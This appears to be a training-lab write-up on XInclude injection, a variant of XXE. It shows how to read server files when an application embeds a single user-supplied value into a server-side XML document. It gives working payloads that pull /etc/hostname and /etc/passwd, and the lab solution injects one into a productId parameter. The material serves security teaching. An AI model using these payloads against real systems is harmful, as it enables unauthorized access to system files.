## Overview :

 Some applications receive client-submitted data, embed it on the server-side into an XML document, and then parse the document. An example of this occurs when client-submitted data is placed into a back-end SOAP request, which is then processed by the backend SOAP service.

In this situation, y**ou cannot carry out a classic XXE attack, because you don't control the entire XML document and so cannot define or modify a DOCTYPE element**. However, you might be able to use XInclude.

**XInclude is a part of the XML specification that allows an XML document to be built from sub-documents**. You can place an XInclude attack within any data value in an XML document, so the _attack can be performed in situations where you only control a single item of data that is placed into a server-side XML document_.

To test for XInclude attacks, insert the following payload into the data entry point and see if the file that you requested gets sent back in the response body:

```xml
<example xmlns:xi="http://www.w3.org/2001/XInclude">
 <xi:include parse="text" href="file:///etc/hostname"/>
</example>
```
> This piece of XML code does two things. First, it references the http://www.w3.org/2001/XInclude namespace so that we can use the `xi:include element. Next, it uses that element to parse and
> include the `/etc/hostname` file in the XML document


## Solution :

Clicking on checkstock feature sends the following POST request.

```xml
POST /product/stock HTTP/2
Host: 0ad200c1031cd2e186b555c2000900e6.web-security-academy.net

productId=1&storeId=1
```

Here we can't see any XML data being sent to the server but the lab description says that _the checkstock feature embeds the user input inside a server-side XML document that is subsequently parsed._

Since we don't control the entire XML document we can't define a DTD. In these kind of situations, we can use the  **XInclude** tag.

**Payload -**

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```
So we enter this payload in the `productID` parameter to retreive the `/etc/passwd` file.

```xml
productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
```

We have now retreived the passwd file.
